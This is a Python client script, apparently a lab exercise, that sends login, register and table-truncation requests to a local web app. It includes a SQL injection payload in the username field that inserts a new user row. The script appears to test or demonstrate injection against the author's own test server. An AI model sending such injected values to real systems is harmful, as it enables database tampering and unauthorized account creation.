import requests


url = 'http://127.0.0.1:5000'

auto_inject = False
auto_injection = "'; INSERT INTO users (username, password) VALUES ('injection','successful'); COMMIT;--"


repeat = True
while(repeat):
    # user input
    task = ''
    while(task != 'l' and task != 'r' and task != 't' and not auto_inject):
        task = input('What do you want to do?\n- Login (l)\n- Register (r)\n- Truncate users table (t)\n')
    if(task == 'l' or task == 'r'):
        username = input('USERNAME: ')
        password = input('PASSWORD: ')

    # execution
    if(task == 'l'):
        try:
            request = requests.post(url + '/login', data={'username': username, 'password': password, 'login': 'Login'})
            if(request.text.splitlines()[0] == '﻿<!--index-->'):
                print('Login successful!')
            elif(request.text.splitlines()[0] == '<!--login-->'):
                print('Login failed!')
            else:
                print('Error ' + str(request.status_code))
        except(WindowsError):
            print('No response from the server!')

    elif(task == 'r'):
        try:
            request = requests.post(url + '/register', data={'username': username, 'password': password, 'register': 'Register'})
            if(request.text.splitlines()[0] == '<!--login-->'):
                print('Register successful!')
            elif(request.text.splitlines()[0] == '<!--register-->'):
                print('Register failed!')
            else:
                print('Error ' + str(request.status_code))
        except(WindowsError):
            print('No response from the server!')

    elif(task == 't'):
        try:
            request = requests.get(url + '/login', data={'truncate_users_table': 'Truncate users table'})
            if(request.text.splitlines()[0] == '<!--login-->'):
                print('Table truncated!')
            else:
                print('Error ' + str(request.status_code))
        except(WindowsError):
            print('No response from the server!')

    elif(auto_inject):
        try:
            request = requests.post(url + '/login', data={'username': auto_injection, 'password': '', 'login': 'Login'})
        except(WindowsError):
            print('No response from the server!')


    # repeat?
    repeat_input = ''
    while(repeat_input != 'y' and repeat_input != 'n' and not auto_inject):
        repeat_input = input('Do you want to send another request? (y/n) ')
    if(repeat_input != 'y'):
        repeat = False
